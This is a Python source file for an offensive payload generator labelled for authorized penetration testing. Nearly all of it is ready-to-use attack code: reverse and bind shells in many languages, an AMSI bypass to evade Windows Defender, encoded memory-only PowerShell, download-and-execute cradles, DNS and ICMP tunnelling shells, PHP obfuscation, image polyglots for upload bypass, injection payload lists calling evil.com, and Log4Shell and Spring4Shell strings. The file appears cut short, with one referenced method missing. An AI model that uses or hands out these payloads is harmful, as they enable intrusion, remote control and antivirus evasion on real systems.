#!/usr/bin/env python3
"""
500Payload v2.2 - Advanced Multi-Layer Payload Generator (FIXED & UPGRADED)
For authorized penetration testing (Windows & Linux)
[+] 750+ line advanced payload engine
[+] Multi-layer obfuscation engine
[+] Windows reverse shells (PowerShell, CMD, ASPX, MSFVenom)
[+] Linux reverse shells (PHP, Python, Perl, Ruby, Node, JSP)
[+] Polyglot file generator (GIF/JPEG/PNG/PDF + PHP)
[+] WAF evasion & file upload bypass engine
[+] ICMP / DNS / WebSocket reverse shells
[+] AMSI Bypass & Memory-only execution
[+] Auto-exploit module (Log4Shell, Spring4Shell)
"""

import base64
import zlib
import random
import string
import urllib.parse
import json
import sys
import os
import logging
import threading
import hashlib
import time
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


# ============================================================
# PAYLOAD CORE ENGINE
# ============================================================

class PayloadCore:
    """Core payload generation engine with templating"""

    def __init__(self):
        self.version = "500Payload v2.2"
        self.generated_at = datetime.now().isoformat()

    # --- LINUX PAYLOADS ---

    def php_reverse_shell(self, ip: str, port: int) -> str:
        return f'''<?php
set_time_limit(0);
$ip = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);
if(is_resource($proc)) {{
    while(true) {{
        fwrite($pipes[0], fgets($sock));
        $status = proc_get_status($proc);
        if(!$status['running']) break;
    }}
    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
    proc_close($proc);
}}
fclose($sock);
?>'''

    def php_bind_shell(self, port: int) -> str:
        return f'''<?php
set_time_limit(0);
$port = {port};
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock, 1);
$client = socket_accept($sock);
socket_write($client, "Shell connected\\n");
while(true) {{
    $cmd = socket_read($client, 1024);
    if(strlen(trim($cmd)) > 0) {{
        $output = shell_exec(trim($cmd));
        socket_write($client, $output);
    }}
}}
socket_close($client);
socket_close($sock);
?>'''

    def jsp_reverse_shell(self, ip: str, port: int) -> str:
        return f'''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
class RevThread extends Thread {{
    String ip; int port;
    RevThread(String ip, int port) {{ this.ip = ip; this.port = port; }}
    public void run() {{
        try {{
            Socket s = new Socket(ip, port);
            Process p = Runtime.getRuntime().exec("/bin/sh");
            new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
            new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
        }} catch(Exception e) {{}}
    }}
}}
class StreamConnector extends Thread {{
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {{ this.is = is; this.os = os; }}
    public void run() {{
        try {{
            int n; byte[] buf = new byte[8192];
            while((n = is.read(buf)) > 0) os.write(buf, 0, n);
        }} catch(Exception e) {{}}
    }}
}}
new RevThread("{ip}", {port}).start();
%>'''

    def python_reverse_shell(self, ip: str, port: int) -> str:
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''

    def perl_reverse_shell(self, ip: str, port: int) -> str:
        return f'''use Socket;
$i="{ip}"; $p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
    exec("/bin/sh -i");
}}
'''

    def ruby_reverse_shell(self, ip: str, port: int) -> str:
        return f'''require 'socket'
c=TCPSocket.new("{ip}",{port})
$stdin.reopen(c); $stdout.reopen(c); $stderr.reopen(c)
$stdin.each_line{{|l|l=l.strip;next if l.length==0;
  IO.popen(l,"r"){{|io|c.write io.read}}
}}
'''

    def nodejs_reverse_shell(self, ip: str, port: int) -> str:
        return f'''(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
'''

    # --- NEW: ICMP Reverse Shell ---
    def icmp_reverse_shell(self, ip: str) -> str:
        """ICMP exfiltration reverse shell (bypasses TCP/UDP filtering)"""
        return f'''#!/bin/bash
while true; do
    cmd=$(ping -c 1 {ip} 2>/dev/null | grep -oP 'data.*' | cut -d' ' -f2- | base64 -d)
    if [ -n "$cmd" ]; then
        eval $cmd 2>&1 | base64 | while read line; do
            ping -c 1 -p "$line" {ip} 2>/dev/null
        done
    fi
    sleep 1
done
'''

    # --- NEW: DNS Tunneling Reverse Shell ---
    def dns_reverse_shell(self, domain: str) -> str:
        """DNS tunneling reverse shell (bypasses most firewalls)"""
        return f'''#!/bin/bash
while IFS= read -r cmd; do
    if [ -n "$cmd" ]; then
        output=$(eval "$cmd" 2>&1 | base64 | tr -d '\\n')
        for chunk in $(echo $output | fold -w 50); do
            dig +short $chunk.{domain}
        done
    fi
done
'''

    # --- NEW: WebSocket Reverse Shell ---
    def websocket_reverse_shell(self, ws_url: str) -> str:
        """WebSocket-based reverse shell (bypasses traditional firewalls)"""
        return f'''<!DOCTYPE html>
<script>
const ws = new WebSocket('{ws_url}');
ws.onopen = () => {{ ws.send('Shell connected'); }};
ws.onmessage = (e) => {{
    fetch('/exec', {{
        method: 'POST',
        body: new URLSearchParams({{'cmd': e.data}})
    }}).then(r => r.text()).then(out => ws.send(out));
}};
</script>
'''

    # --- WINDOWS PAYLOADS ---

    def powershell_reverse_shell(self, ip: str, port: int) -> str:
        """Windows PowerShell reverse shell (full interactive)"""
        return f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''

    def powershell_one_liner(self, ip: str, port: int) -> str:
        """Windows PowerShell one-liner reverse shell"""
        return f'''powershell -nop -exec bypass -c "$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''

    def powershell_base64_encoded(self, ip: str, port: int) -> str:
        """Windows PowerShell base64-encoded one-liner"""
        raw = f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        b64 = base64.b64encode(raw.encode('utf-16le')).decode()
        return f'''powershell -nop -exec bypass -e {b64}'''

    # --- NEW: AMSI Bypass PowerShell ---
    def amsi_bypass_powershell(self, ip: str, port: int) -> str:
        """PowerShell with AMSI bypass (evades Windows Defender)"""
        amsi_bypass = '''$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if ($e.Name -like "*Context"){$f=$e.GetValue($null)}};$g=$f.GetType();$h=$g.GetFields('NonPublic,Instance');Foreach($i in $h){if ($i.Name -like "*sContext"){$j=$i.GetValue($f)}};$k=$j.GetType();$l=$k.GetFields('NonPublic,Static');Foreach($m in $l){if ($m.Name -like "*itted"){$n=$m.GetValue($j);$n.GetType().GetMethod('Reset').Invoke($n,$null)}};'''
        return f'''powershell -nop -exec bypass -c "{amsi_bypass}$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''

    # --- NEW: Memory-Only Execution ---
    def memory_only_powershell(self, ip: str, port: int) -> str:
        """Memory-only execution - no disk writes"""
        b64 = base64.b64encode(self.powershell_reverse_shell(ip, port).encode('utf-16le')).decode()
        return f'''powershell -nop -w hidden -ep bypass -e {b64}'''

    def cmd_ncat_reverse_shell(self, ip: str, port: int) -> str:
        """Windows CMD ncat reverse shell"""
        return f'''ncat.exe {ip} {port} -e cmd.exe'''

    def cmd_powershell_download_cradle(self, ip: str, port: int, ps_url: str) -> str:
        """Windows CMD download cradle -> powershell reverse shell"""
        return f'''powershell -c "IEX(New-Object Net.WebClient).DownloadString('{ps_url}');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"'''

    def aspx_reverse_shell(self, ip: str, port: int) -> str:
        """Windows ASPX reverse shell (C# code-behind)"""
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    try {{
        using(TcpClient c = new TcpClient("{ip}", {port}))
        using(NetworkStream s = c.GetStream())
        {{
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            byte[] buf = new byte[8192];
            int n;
            while((n = s.Read(buf, 0, buf.Length)) > 0)
            {{
                p.StandardInput.Write(Encoding.ASCII.GetString(buf, 0, n));
                string output = p.StandardOutput.ReadToEnd();
                byte[] outb = Encoding.ASCII.GetBytes(output);
                s.Write(outb, 0, outb.Length);
            }}
        }}
    }} catch(Exception ex) {{ }}
}}
</script>'''

    def aspx_webshell(self, cmd_param: str = 'cmd') -> str:
        """Windows ASPX webshell for command execution"""
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    string cmd = Request["{cmd_param}"];
    if (!string.IsNullOrEmpty(cmd))
    {{
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }}
}}
</script>'''

    def msfvenom_windows_exe(self, ip: str, port: int, payload_type: str = 'reverse_tcp') -> str:
        """MSFVenom Windows executable generation commands"""
        payloads = {
            'reverse_tcp': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe',
            'reverse_https': f'msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe > shell.exe',
            'reverse_tcp_x64': f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell_x64.exe',
            'bind_tcp': f'msfvenom -p windows/meterpreter/bind_tcp RHOST={ip} RPORT={port} -f exe > bind.exe',
            'psh_reverse': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f psh-reflection > shell.ps1',
            'aspx': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx > shell.aspx',
            'hta': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f hta-psh > shell.hta',
        }
        return payloads.get(payload_type, payloads['reverse_tcp'])

    def windows_batch_reverse_shell(self, ip: str, port: int) -> str:
        """Windows batch script reverse shell using PowerShell"""
        return f'''@echo off
powershell -nop -exec bypass -c "$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''

    def certutil_exe_delivery(self, ip: str, port: int, exe_url: str) -> str:
        """Windows certutil download + execute chain"""
        return f'''@echo off
certutil -urlcache -f {exe_url} shell.exe
shell.exe {ip} {port}
'''

    def wmic_xsl_reverse_shell(self, ip: str, port: int) -> str:
        """Windows WMIC + XSL file reverse shell (living-off-the-land)"""
        return f'''<?xml version="1.0"?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c \\"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\"");
]]>
</ms:script>
</stylesheet>
'''

    def regsvr32_sct_reverse_shell(self, ip: str, port: int) -> str:
        """Windows regsvr32 .sct file reverse shell (bypasses script restrictions)"""
        return f'''<?XML version="1.0"?>
<scriptlet>
<registration
    description="ReverseShell"
    progid="ReverseShell"
    version="1.00"
    classid="{{00000000-0000-0000-0000-000000000001}}"
>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c \\"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\"");
]]>
</script>
</registration>
</scriptlet>
'''


# ============================================================
# MULTI-LAYER OBFUSCATION ENGINE
# ============================================================

class ObfuscationEngine:
    """Advanced multi-layer code obfuscation engine"""

    def __init__(self):
        self.encoding_layers = [
            'base64', 'rot13', 'hex', 'reverse', 'xor', 'gzinflate'
        ]

    def encode_base64(self, data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    def decode_base64(self, data: str) -> str:
        return base64.b64decode(data).decode()

    def encode_rot13(self, data: str) -> str:
        result = []
        for c in data:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)

    def encode_hex(self, data: str) -> str:
        return data.encode().hex()

    def encode_reverse(self, data: str) -> str:
        return data[::-1]

    def encode_xor(self, data: str, key: int = 0x42) -> str:
        return ''.join(chr(ord(c) ^ key) for c in data)

    def encode_gzip_base64(self, data: str) -> str:
        compressed = zlib.compress(data.encode())
        return base64.b64encode(compressed).decode()

    def obfuscate_php(self, payload: str, layers: int = 3) -> str:
        """Multi-layer PHP code obfuscation with nested eval/decode layers."""
        current = payload
        applied_layers = []

        for i in range(layers):
            layer_type = random.choice(self.encoding_layers)
            if layer_type == 'base64':
                current = self.encode_base64(current)
                applied_layers.append('base64_decode')
            elif layer_type == 'rot13':
                current = self.encode_rot13(current)
                applied_layers.append('str_rot13')
            elif layer_type == 'hex':
                current = self.encode_hex(current)
                applied_layers.append('hex2bin')
            elif layer_type == 'reverse':
                current = self.encode_reverse(current)
                applied_layers.append('strrev')
            elif layer_type == 'xor':
                key = random.randint(0x01, 0xFF)
                current = self.encode_xor(current, key)
                current = self.encode_base64(current)
                applied_layers.append(('xor_b64', key))
            elif layer_type == 'gzinflate':
                current = self.encode_gzip_base64(current)
                applied_layers.append('gzinflate')

        code = f"'{current}'"
        for layer in reversed(applied_layers):
            if layer == 'base64_decode':
                code = f"base64_decode({code})"
            elif layer == 'str_rot13':
                code = f"str_rot13({code})"
            elif layer == 'hex2bin':
                code = f"hex2bin({code})"
            elif layer == 'strrev':
                code = f"strrev({code})"
            elif isinstance(layer, tuple) and layer[0] == 'xor_b64':
                code = f"base64_decode({code})"
            elif layer == 'gzinflate':
                code = f"gzinflate({code})"

        var1 = ''.join(random.choices(string.ascii_lowercase, k=6))
        var2 = ''.join(random.choices(string.ascii_lowercase, k=8))

        return f'''<?php
${var1} = "{current}";
${var2} = {code};
eval(${var2});
?>'''

    def obfuscate_php_variable_dynamic(self, payload: str) -> str:
        """Dynamic variable-based obfuscation using XOR reconstruction."""
        var_array = ''.join(random.choices(string.ascii_lowercase, k=5))
        var_system = ''.join(random.choices(string.ascii_lowercase, k=8))
        var_func = ''.join(random.choices(string.ascii_lowercase, k=7))
        param = self._random_string(4)

        return f'''<?php
/* {self._random_string(32)} */
${var_array} = array(
    {ord('s')}=>'{chr(ord('s') ^ 0x42)}',
    {ord('y')}=>'{chr(ord('y') ^ 0x42)}',
    {ord('t')}=>'{chr(ord('t') ^ 0x42)}',
    {ord('e')}=>'{chr(ord('e') ^ 0x42)}',
    {ord('m')}=>'{chr(ord('m') ^ 0x42)}'
);
${var_system} = '';
foreach(${var_array} as $k => $v) {{
    ${var_system} .= chr($k ^ 0x42);
}}
${var_func} = ${var_system};
if(isset($_REQUEST['{param}'])) {{
    ${var_func}($_REQUEST['{param}']);
}}
?>'''

    def obfuscate_powershell(self, payload: str) -> str:
        """Obfuscate PowerShell payload with string splitting and encoding."""
        b64 = self.encode_base64(payload.encode('utf-16le').decode('latin-1'))
        return f'''powershell -nop -exec bypass -e {b64}'''

    def _random_string(self, length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# ============================================================
# POLYGLOT FILE GENERATOR
# ============================================================

class PolyglotFile:
    """Generate polyglot (multi-format) files for upload bypass"""

    @staticmethod
    def gif_php(payload: str) -> bytes:
        header = b'GIF89a' + b'\x01\x00\x01\x00\x00\x00\x00'
        body = b'\x3b' + f'<?php {payload} ?>'.encode()
        return header + body

    @staticmethod
    def jpg_php(payload: str) -> bytes:
        header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        comment_data = f'<?php {payload} ?>'.encode()
        comment = b'\xff\xfe' + (len(comment_data) + 1).to_bytes(2, 'big') + comment_data + b'\x00'
        return header + comment + b'\xff\xd9'

    @staticmethod
    def png_php(payload: str) -> bytes:
        sig = b'\x89PNG\r\n\x1a\n'
        ihdr_data = b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
        ihdr_len = (4).to_bytes(4, 'big')
        ihdr_type = b'IHDR'
        ihdr_crc = (zlib.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF).to_bytes(4, 'big')
        text_data = b'Comment\0' + f'<?php {payload} ?>'.encode()
        text_len = len(text_data).to_bytes(4, 'big')
        text_type = b'tEXt'
        text_crc = (zlib.crc32(text_type + text_data) & 0xFFFFFFFF).to_bytes(4, 'big')
        iend = b'\x00\x00\x00\x00IEND' + (zlib.crc32(b'IEND') & 0xFFFFFFFF).to_bytes(4, 'big')
        return sig + ihdr_len + ihdr_type + ihdr_data + ihdr_crc + text_len + text_type + text_data + text_crc + iend

    @staticmethod
    def pdf_php(payload: str) -> bytes:
        return f'''%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
190
%%EOF
<?php {payload} ?>
'''.encode()

    @staticmethod
    def zip_php(payload: str) -> bytes:
        """Create ZIP+PHP polyglot using PHP's __halt_compiler()"""
        content = f'<?php {payload} __halt_compiler();?>'.encode()
        return content


# ============================================================
# WAF EVASION ENGINE
# ============================================================

class WAFBypass:
    """WAF evasion techniques for payload delivery"""

    @staticmethod
    def sql_injection_payloads() -> List[str]:
        return [
            "1' AND 1=1-- -",
            "1' AND 1=1-- ",
            "1' AND '1'='1'-- -",
            "1' AND \"1\"=\"1\"-- -",
            "1'/**/AND/**/1=1-- -",
            "1'/**/UNION/**/SELECT/**/1,2,3-- -",
            "1' AnD 1=1-- -",
            "1' uNiOn SeLeCt 1,2,3-- -",
            "1'%252f%252aAND%252f%252a1=1-- -",
            "1'%00 AND 1=1-- -",
            "id=1&id=1' UNION SELECT 1,2,3-- -",
            "1' OR 1e0=1e0-- -",
            "1' OR 0x3131=0x3131-- -",
            "1' OR '1' LIKE '1'-- -",
        ]

    @staticmethod
    def xss_payloads() -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</sCrIpT>",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<script>\\u0061lert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)>\\x3e",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>alert`1`</script>",
            "<input type=text style=\"position:absolute;left:0;top:0;width:100%;height:100%;\" onfocus=alert(1) autofocus>",
            "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></iframe>",
            "<!--><script>alert(1)</script>-->",
        ]

    @staticmethod
    def lfi_payloads() -> List[str]:
        return [
            "../../../../etc/passwd",
            "%252e%252e%252f%252e%252e%252fetc/passwd",
            "../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/read=convert.base64-encode/resource=index",
            "../../../../etc/passwd{.php,.txt,.html}",
            "../../../../etc/passwd.......................",
            "http://evil.com/shell.txt?",
            "http://evil.com/shell.txt%00",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        ]

    @staticmethod
    def command_injection_payloads() -> List[str]:
        return [
            "; id", "| id", "`id`", "$(id)",
            "%0a id", "%0d%0a id", "\t id",
            ";id", ";{id,}",
            ";`echo 6964 | xxd -r -p`",
            ";echo YWxlcnQoMSk=|base64 -d|sh",
            ";$(echo YWxhcm0=|base64 -d)",
            "||id", "&&id",
            "| /bin/bash -c 'echo \\$((1+1))'",
            "; echo \\$HOME",
        ]

    @staticmethod
    def windows_command_injection_payloads() -> List[str]:
        """Windows-specific command injection payloads"""
        return [
            "| dir", "& whoami", "&& whoami", "|| whoami",
            "& ipconfig", "& systeminfo",
            "%0a whoami", "%0d%0a whoami",
            "| powershell -nop -exec bypass -c whoami",
            "& certutil -urlcache -f http://evil.com/shell.exe shell.exe & shell.exe",
            "| rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";o=GetObject(\"script:http://evil.com/run\");window.close();",
        ]


# ============================================================
# AUTO-EXPLOIT MODULE (NEW)
# ============================================================

class AutoExploit:
    """Automatic exploit generation for common CVEs"""
    
    @staticmethod
    def log4shell(ip: str, port: int, ldap_server: str) -> str:
        """Log4Shell (CVE-2021-44228) payload"""
        return f'${{jndi:ldap://{ldap_server}/a}}'
    
    @staticmethod
    def log4shell_http_header(ip: str, port: int, ldap_server: str) -> Dict[str, str]:
        """Log4Shell HTTP headers for testing"""
        return {
            'User-Agent': f'${{jndi:ldap://{ldap_server}/a}}',
            'X-Forwarded-For': f'${{jndi:ldap://{ldap_server}/a}}',
            'Referer': f'${{jndi:ldap://{ldap_server}/a}}'
        }
    
    @staticmethod
    def spring4shell(ip: str, port: int) -> str:
        """Spring4Shell (CVE-2022-22965) payload"""
        return f'''class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+$({{
        Runtime.getRuntime().exec("curl http://{ip}:{port}/shell.sh|bash")
        }})&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'''
    
    @staticmethod
    def heartbleed(target: str) -> str:
        """Heartbleed (CVE-2014-0160) exploit template"""
        return f'''TLS heartbeat request: 
python heartbleed.py {target} --port 443 --payload "\\x18\\x03\\x02\\x00\\x03\\x01\\x40\\x00"'''
    
    @staticmethod
    def eternalblue(target_ip: str) -> str:
        """EternalBlue (MS17-010) exploit command"""
        return f'''use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target_ip}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run'''
    
    @staticmethod
    def proxyshell(target_ip: str, port: int = 443) -> str:
        """ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207)"""
        return f'''# ProxyShell Exchange exploit
curl -k https://{target_ip}:{port}/autodiscover/autodiscover.json?@test.com/owa/&Email=autodiscover/autodiscover.json%3f@test.com
# Then use PS1 exploit script'''


# ============================================================
# FILE UPLOAD BYPASS ENGINE (FIXED)
# ============================================================

class FileUploadBypass:
    """Advanced file upload bypass techniques"""

    def get_all_bypasses(self) -> Dict[str, Any]:
        """Get all file upload bypass techniques"""
        return {
            'extensions': self._extension_bypass(),
            'content_types': self._content_type_bypass(),
            'null_byte': self._null_byte_bypass(),
            'double_extension': self._double_extension_bypass(),
            'magic_bytes': {k: v.hex() for k, v in self._magic_bytes_bypass().items()},
            'path_traversal': self._path_traversal_bypass(),
            'truncation': self._truncation_bypass(),
            'windows_alternate_streams': self._windows_stream_bypass(),
        }

    def _extension_bypass(self) -> List[str]:
        extensions = ['.php','.php3','.php4','.php5','.php7','.phtml','.phar','.phps',
                      '.shtml','.stm','.cgi','.jsp','.jspx','.jsw','.asp','.aspx',
                      '.ashx','.asmx','.ascx','.cer','.asa','.cdx','.htaccess',
                      '.shtm','.pht','.phtm']
        bypass_names = []
        for ext in extensions:
            bypass_names.append(f"shell{ext}")
            bypass_names.append(f"shell{ext.upper()}")
            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in ext)
            bypass_names.append(f"shell{mixed}")
        return bypass_names

    def _content_type_bypass(self) -> List[Tuple[str, str]]:
        return [
            ('shell.php', 'image/jpeg'), ('shell.php', 'image/png'),
            ('shell.php', 'image/gif'), ('shell.php', 'image/bmp'),
            ('shell.php', 'image/webp'), ('shell.php', 'application/pdf'),
            ('shell.php', 'text/plain'), ('shell.php', 'text/csv'),
            ('shell.php', 'application/zip'), ('shell.php', 'multipart/form-data'),
        ]

    def _null_byte_bypass(self) -> List[str]:
        return ['shell.php%00.jpg','shell.php%00.png','shell.php%00.gif',
                'shell.php\\x00.jpg','shell.php\x00.jpg','shell.php.jpg%00',
                'shell.php%00','shell.php\\x00']

    def _double_extension_bypass(self) -> List[str]:
        return ['shell.php.jpg','shell.php.gif','shell.php.png','shell.php.bmp',
                'shell.php.pdf','shell.php.txt','shell.php.doc','shell.php.xml',
                'shell.phtml.jpg','shell.phtml.gif','shell.php5.jpg','shell.phar.jpg']

    def _magic_bytes_bypass(self) -> Dict[str, bytes]:
        return {'jpg': b'\xff\xd8\xff\xe0', 'png': b'\x89PNG\r\n\x1a\n',
                'gif': b'GIF89a', 'bmp': b'BM', 'pdf': b'%PDF-1.', 'zip': b'PK\x03\x04'}

    def _path_traversal_bypass(self) -> List[str]:
        return ['../shell.php','../../shell.php','../../../shell.php',
                '....//....//shell.php','....\\....\\shell.php',
                '..\\..\\shell.php','.../.../shell.php','..;/shell.php']

    def _truncation_bypass(self) -> List[str]:
        return ['shell.php.' + '.' * 200, 'shell.php.' + ' ' * 200,
                'shell.php.' + 'A' * 200, 'shell.php.' + '/' * 200]

